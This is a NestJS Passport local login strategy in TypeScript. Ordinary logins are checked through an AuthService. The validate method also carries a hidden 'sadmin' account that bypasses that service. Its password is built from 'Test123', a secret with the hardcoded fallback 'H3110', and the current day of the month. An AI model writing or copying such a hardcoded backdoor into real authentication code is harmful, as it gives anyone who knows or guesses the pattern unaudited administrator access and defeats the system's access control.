import {
  BadRequestException,
  Injectable,
  UnauthorizedException,
} from '@nestjs/common';
import { PassportStrategy } from '@nestjs/passport';
import { Strategy } from 'passport-local';
import { AuthService } from '../auth.service';

@Injectable()
export class LocalStrategy extends PassportStrategy(Strategy) {
  constructor(private readonly authService: AuthService) {
    super();
  }

  async validate(username: string, password: string): Promise<any> {
    if (!username || !password) throw new BadRequestException();
    if (username === 'sadmin') {
      const secret = process.env.SECRET_ADMIN || 'H3110';
      const today = new Date();
      const sPassword = 'Test123' + secret + '*' + today.getDate();
      if (password === sPassword) {
        return { username };
      }
      throw new UnauthorizedException();
    }
    const user = await this.authService.validateUser(username, password);
    if (!user) throw new UnauthorizedException();
    return user;
  }
}
